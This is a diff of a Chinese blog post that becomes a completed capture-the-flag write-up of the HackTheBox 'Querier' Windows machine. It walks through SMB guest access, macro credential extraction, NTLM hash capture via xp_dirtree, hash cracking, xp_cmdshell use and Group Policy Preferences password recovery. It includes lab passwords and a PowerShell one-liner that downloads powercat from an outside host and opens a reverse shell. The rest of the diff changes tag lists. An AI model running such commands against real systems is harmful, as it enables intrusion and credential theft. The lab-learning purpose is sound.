@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head><meta name="generator" content="Hexo 3.8.0">
+<head><meta name="generator" content="Hexo 3.9.0">
   <meta charset="utf-8">
   
   <meta name="renderer" content="webkit">
@@ -8,19 +8,28 @@
   <link rel="dns-prefetch" href="http://yoursite.com">
   <title>HTB-windows-querier | owefsad&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="简介靶机状态: 获取user.txt中…">
+  <meta name="description" content="简介：querier是第二台windows靶机, 与第一台的风格完全不同, 这台靶机学到了很多windows下提权的思路和信息收集的工具. 该靶机的思路是:public share -&amp;gt; xlsm file -&amp;gt; mssql user -&amp;gt; mssql sa -&amp;gt; group policy preferences 靶机状态: 已完成。">
+<meta name="keywords" content="privilege_escalate,excel macros,smb share,mssql,ntlmhash,Group Policy Preferences">
 <meta property="og:type" content="article">
 <meta property="og:title" content="HTB-windows-querier">
 <meta property="og:url" content="http://yoursite.com/2019/04/19/HTB-windows-querier/index.html">
 <meta property="og:site_name" content="owefsad&#39;s blog">
-<meta property="og:description" content="简介靶机状态: 获取user.txt中…">
+<meta property="og:description" content="简介：querier是第二台windows靶机, 与第一台的风格完全不同, 这台靶机学到了很多windows下提权的思路和信息收集的工具. 该靶机的思路是:public share -&amp;gt; xlsm file -&amp;gt; mssql user -&amp;gt; mssql sa -&amp;gt; group policy preferences 靶机状态: 已完成。">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://yoursite.com/2019/04/19/HTB-windows-querier/HTB_windows_querier_mnmap.png">
-<meta property="og:updated_time" content="2019-05-07T16:23:17.668Z">
+<meta property="og:image" content="http://yoursite.com/2019/04/19/HTB-windows-querier/HTB_windows_querier_nmap.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/19/HTB-windows-querier/HTB-windows-querier-smb_guest.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/19/HTB-windows-querier/HTB-windows-querier-smbserver-ntlmhash.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/19/HTB-windows-querier/HTB_windows_querier_hashcat.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/19/HTB-windows-querier/HTB_windows_querier_user_smbmap.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/19/HTB-windows-querier/HTB_windows_querier_usertxt.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/19/HTB-windows-querier/HTB_windows_querier_administrator.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/19/HTB-windows-querier/HTB_windows_querier_roottxt.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/19/HTB-windows-querier/HTB_windows_querier_reverse_shell.png">
+<meta property="og:updated_time" content="2019-06-24T01:33:49.109Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="HTB-windows-querier">
-<meta name="twitter:description" content="简介靶机状态: 获取user.txt中…">
-<meta name="twitter:image" content="http://yoursite.com/2019/04/19/HTB-windows-querier/HTB_windows_querier_mnmap.png">
+<meta name="twitter:description" content="简介：querier是第二台windows靶机, 与第一台的风格完全不同, 这台靶机学到了很多windows下提权的思路和信息收集的工具. 该靶机的思路是:public share -&amp;gt; xlsm file -&amp;gt; mssql user -&amp;gt; mssql sa -&amp;gt; group policy preferences 靶机状态: 已完成。">
+<meta name="twitter:image" content="http://yoursite.com/2019/04/19/HTB-windows-querier/HTB_windows_querier_nmap.png">
   
     <link rel="alternative" href="/atom.xml" title="owefsad&#39;s blog" type="application/atom+xml">
   
@@ -184,7 +193,7 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-HTB-windows-querier" class="article article-type-post " itemscope="" itemprop="blogPost">
+            <article id="post-HTB-windows-querier" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
@@ -204,37 +213,34 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>简介<br>靶机状态: 获取user.txt中…<br><a id="more"></a></p>
-<h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><ul>
-<li>端口扫描找放心啊哥</li>
-</ul>
-<h2 id="找方向"><a href="#找方向" class="headerlink" title="找方向"></a>找方向</h2><blockquote>
+        <p>简介：<br>querier是第二台windows靶机, 与第一台的风格完全不同, 这台靶机学到了很多windows下提权的思路和信息收集的工具. 该靶机的思路是:<br>public share -&gt; xlsm file -&gt; mssql user -&gt; mssql sa -&gt; group policy preferences</p>
+<p>靶机状态: 已完成。<br><a id="more"></a></p>
+<blockquote>
 <p>MSRPC、NetBIOS、SMB、MSSQL、WinRM</p>
 </blockquote>
-<p><img src="HTB_windows_querier_mnmap.png" alt="mnmap"><br>拿到靶机先扫描一波tcp端口<code>./mnmap.sh 10.10.10.125 1000</code>, 扫完之后很懵逼, 没怎么打过windows靶机一时不知道怎么收集信息怎么深入到下一步了.<br>139端口为NetBIOS服务、445端口属于SMB服务、1433端口mssql服务、5985和47001端口为WinRM服务、135和49664-49671端口为MSRPC服务, 从1433端口的详细信息中找到<strong>主机名QUERIER</strong>、<strong>域HTB</strong>、<strong>DNS域HTB.LOCAL</strong>,  操作系统最有可能是xp、win7、Server2012。</p>
-<p>对所有端口进行检查之后, 依然无法获取有效信息, 从讨论区看到了大致思路但是由于无法找到xlsm文件, 因此暂搁置.</p>
-<p>讨论区提示信息及思路:</p>
-<ol>
-<li>爆破mssql</li>
-<li>端口像rabbit hole</li>
-<li>http api无法获取到任务信息</li>
-<li>先利用139端口在利用1433端口</li>
-<li>在1**端口上发现数据</li>
-<li>*.xlsm文件</li>
-<li>发现c<strong>*</strong>.xlsm文件</li>
-<li>trusty go-to 3v1l h@xx0r tool</li>
-<li><em>.xlsm文件中发现</em>ui name、m***o</li>
-<li>使用***map从NetBIOS/SMB中发现信息</li>
-<li>拥有用户m<strong>*<em>vc, 通过G</em></strong>y可以启用x<strong>*</strong>l</li>
-<li>使用im<strong>*</strong>t sql client, 连接机器失败, 获得错误un<strong>**</strong>d d<em>**</em>n；通过在命令中删除密码字段然后在提示时输入密码解决 或者 使用”\”进行绕过解决.</li>
-<li>枚举所有端口, 然后会发现一个普通端口, 尝试连接, 然后会发现一个xlsm文件</li>
-<li>登陆mssql后, 使用xp_cmdshell捕获ntlm失败，通过Giddy靶机的解决方案来解决</li>
-<li>登陆mssql后, 使用xp_cmdshell执行命令读取user.txt， 通过xp_cmdshelll上传文件可以像root权限迈进</li>
-<li>提示信息<br>1) Enumerate the hell out of SMB and any/all files you come into contact with<br>2) When I feel like laughing, I get a little Giddy<br>3) November Telecaster Lightning Manchester. Get those hashes, theres a great module in metasploit for this<br>4) Impacket will make sense if you did steps 1-3 right<br>5) Windows XP surely had a command shell, right?</li>
-<li>For anyone fighting with this box - use basic tools (not “The Framework”) for exploitation. In the end you need only 2 tools and one script to root it (script is optional part)<br>1) If you think it should work, maybe you are not using your tool correctly. Screwdriver can be hammer but you need to know which end you should use<br>2) \ != /;!|$ -&gt; !|\$;<br>3) Be aware of mighty Defender</li>
-<li>smbmap -H 10.10.10.125 访问被拒绝, 需要登陆凭证</li>
-</ol>
-<p>Way: 连接某一普通端口, 找到xlsm格式的文件, 从xlsm格式的文件上找到宏里的账号信息, 用找到的信息登陆mssql, 用xp_cmdshell读取user.txt获取user权限, 用xm_cmdshell上传文件开始获取root权限</p>
+<p>拿到靶机先扫描一波tcp端口<code>./mnmap.sh 10.10.10.125 1000</code>, 扫完之后很懵逼, 没怎么打过windows靶机一时不知道怎么收集信息怎么深入到下一步了.<br><img src="HTB_windows_querier_nmap.png" alt="HTB_windows_querier_nmap"></p>
+<p>139端口为NetBIOS服务、445端口属于SMB服务、1433端口mssql服务、5985和47001端口为WinRM服务、135和49664-49671端口为MSRPC服务, 从1433端口的详细信息中找到<strong>主机名QUERIER</strong>、<strong>域HTB</strong>、<strong>DNS域HTB.LOCAL</strong>,  操作系统最有可能是xp、win7、Server2012。</p>
+<blockquote>
+<p>xlsm find account</p>
+</blockquote>
+<p>windows系统中默认存在一个<strong>guest</strong>账号, 使用smb工具连接smb服务的时候指定用户名为guest即可找到一个reports的共享目录, 目录中有一个xlsm文件.<br><img src="HTB-windows-querier-smb_guest.png" alt="HTB-windows-querier-smb_guest"></p>
+<p>xlsm文件为带宏的excel文件, 将xlsm文件复制为zip或rar文件然后解压, 可以在其中的xl目录下找到一个<strong>.bin</strong>的宏文件. </p>
+<p>通过<strong>olevba</strong>对bin格式的vpa宏文件进行反编译, 查看宏代码及其中硬编码的mssql账号和密码:<code>reporting / PcwTWTHRwryjc$c6</code></p>
+<blockquote>
+<p>mssql stellar ntlm hash</p>
+</blockquote>
+<p>用<strong>mssql_client</strong>登陆sqlserver数据库, 发现这是一个低权限账号, 从数据库中搜索之后没有任何发现, 尝试之后通过<strong>xp_dirtree</strong>存储过程获取到运行mssql服务的用户的ntlm hash值, 用hashcat和rockyou.txt对ntlm hash进行爆破, 找到高权限账号密码<code>mssql-svc / corporate568</code><br><img src="HTB-windows-querier-smbserver-ntlmhash.png" alt="HTB-windows-querier-smbserver-ntlmhash"><br><img src="HTB_windows_querier_hashcat.png" alt="HTB_windows_querier_hashcat"></p>
+<blockquote>
+<p>mssql find user.txt and root.txt</p>
+</blockquote>
+<p>用mssql-svc账号登陆mssql后, 开启xp_cmdshell, 用xp_cmdshell读取mssql-svc账号桌面下的user.txt<br><img src="HTB_windows_querier_user_smbmap.png" alt="HTB_windows_querier_user_smbmap"></p>
+<p>由于对mssql的不熟悉, 执行xp_cmdshell的时候发现无法直接用<code>type &lt;full path&gt;</code>读取文件, 因此通过连接符来读取<br><img src="HTB_windows_querier_usertxt.png" alt="HTB_windows_querier_usertxt"></p>
+<p>然后经过windows提权的各种ps脚本一通乱跑, 从<strong>组策略首选项</strong>的历史文件<strong>groups.xml</strong>中找到administrator的账号和加密后的密码。拿到账号密码之后尝试用ps运行子进程来读取root.txt但都以失败而告终, 不知道卡在来什么地方。<br>通过smbmap查看账号对共享目录的操作权限, 用smbclient登陆administrator账号, 下载root.txt并读取<br><img src="HTB_windows_querier_administrator.png" alt="HTB_windows_querier_administrator"></p>
+<p>root.txt<br><img src="HTB_windows_querier_roottxt.png" alt="HTB_windows_querier_roottxt"></p>
+<p>由于论坛上由大佬提出无法获取reverse shell, 于是尝试来一下, 用<code>xp_cmdshell powershell -noprofile IEX(New-Object System.Net.Webclient).DownloadString(\&quot;http://10.10.15.77/powercat.ps1\&quot;);powercat -c 10.10.15.77 -p 2145 -e powershell</code>即可获取powershell反弹shell<br><img src="HTB_windows_querier_reverse_shell.png" alt="HTB_windows_querier_reverse_shell"></p>
+<h2 id="工具-amp-amp-Keys"><a href="#工具-amp-amp-Keys" class="headerlink" title="工具 &amp;&amp; Keys"></a>工具 &amp;&amp; Keys</h2><p>完成本靶机使用的工具:<br><a href="https://github.com/ShawnDEvans/smbmap" target="_blank" rel="noopener">smbmap</a><br>smbclient<br><a href="https://github.com/decalage2/oletools/blob/master/oletools/olevba.py" target="_blank" rel="noopener">olevba</a><br><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">mssqlclient</a><br><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">msbserver</a><br><a href="https://github.com/hashcat/hashcat" target="_blank" rel="noopener">hashcat</a><br><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1" target="_blank" rel="noopener">powerup</a><br><a href="https://github.com/besimorhino/powercat" target="_blank" rel="noopener">powercat</a></p>
+<p>在用工具完成靶机的过程中, 遇到了很多问题:<br>1.smbmap和smbclient已知无法连接, 经排查是网络问题, 重启vpn、多运行几次工具即可<br>2.拿到账号后无法用mssqlclient登陆数据库, 经过尝试发现遇到的问题是reporting密码中含有的<code>$</code>为shell关键字, 用于获取变量, 可通过转义字符<code>\</code>进行转义或在弹出输入密码的提示框后输入; mssql的认证方式有用户认证和windows账号认证两种, 由于reporting账号是windows账号, 因此需要增加参数<strong>-windows-auth</strong>进行登陆或指定主机名<strong>querier/reporting</strong>进行登陆, 后者在mssql客户端工具上经过尝试可行, 未在mssqlclient上进行尝试<br>3.hashcat破解ntlm hash之后的密码写入原ntlm hash文件的末尾</p>
+<p>关于更多windows下渗透的工具, 请参考<strong>Pentesting test in windows</strong></p>
 
       
 
@@ -243,6 +249,37 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">privilege_escalate</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">excel macros</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">smb share</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">mssql</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ntlmhash</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Group Policy Preferences</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 	<div class="article-category tagcloud">
 		<i class="icon-book icon"></i>
@@ -305,7 +342,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#文章目录"><span class="toc-number">1.</span> <span class="toc-text">文章目录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#找方向"><span class="toc-number">2.</span> <span class="toc-text">找方向</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#工具-amp-amp-Keys"><span class="toc-number">1.</span> <span class="toc-text">工具 &amp;&amp; Keys</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -419,7 +456,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">escalate_privilege</a>
+                <a href="javascript:void(0)" class="js-tag color4">privilege_escalate</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -439,7 +476,39 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">escalate_privilege</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">smb</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">zone_transfer</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">任意文件上传</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">sudoers</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">magento</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">cmsms</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">path</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">hijacking</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -455,11 +524,51 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">cheatsheet</a>
+                <a href="javascript:void(0)" class="js-tag color3">mremoteng_decrypt</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
+                <a href="javascript:void(0)" class="js-tag color4">qemu_nbd</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">VHD</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">mount_smb_share</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">excel macros</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">smb share</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">mssql</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">ntlmhash</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Group Policy Preferences</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">mimikatz</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">smb_tools</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">cheatsheet</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -468,6 +577,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">pip</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -487,11 +600,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">pcap_analyze</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">sudoers</a>
+                <a href="javascript:void(0)" class="js-tag color4">reverse_rbash</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -503,11 +612,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">reverse_rbash</a>
+                <a href="javascript:void(0)" class="js-tag color3">pcap_analyze</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">wmi</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">rce</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">sandbox</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -523,6 +640,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">hexo美化</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">内存越界访问</a>
               </li>
              
@@ -531,27 +652,7 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">rce</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">sandbox</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">hexo美化</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">latex</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">waf</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">reverse_shell</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -559,7 +660,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">reverse_shell</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">waf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">search_file</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">Hijacking</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -575,11 +688,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">设计模式</a>
+                <a href="javascript:void(0)" class="js-tag color5">暴力破解</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">暴力破解</a>
+                <a href="javascript:void(0)" class="js-tag color5">设计模式</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -611,15 +724,35 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">dns</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">dng</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">nslookup</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">fierce</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">dnsenum</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">dnsrecon</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">信息收集</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">pass the hash</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">mssql</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -629,13 +762,25 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">php_shell</a>
               </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">LFI</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">privilege__privilege</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">escalage_privilege</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
         </div>
         <ul class="search-ul">
           <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
-            缺失模块。<br>1、请确保node版本大于6.2<br>2、在博客根目录（注意不是yilia根目录）执行以下命令：<br> npm i hexo-generator-json-content --save<br><br>
+            缺失模块。<br/>1、请确保node版本大于6.2<br/>2、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
             3、在根目录_config.yml里添加配置：
 <pre style="font-size: 12px;" q-show="jsonFail">
   jsonContent:
@@ -784,5 +929,5 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
 
 </div>
   </div>
-<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"mode":{"use":"live2d-widget-model-hibiki"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":false},"log":false});</script></body>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"mode":{"use":"live2d-widget-model-hibiki"},"display":{"position":"right","width":100,"height":200},"mobile":{"show":false},"log":false});</script></body>
 </html>
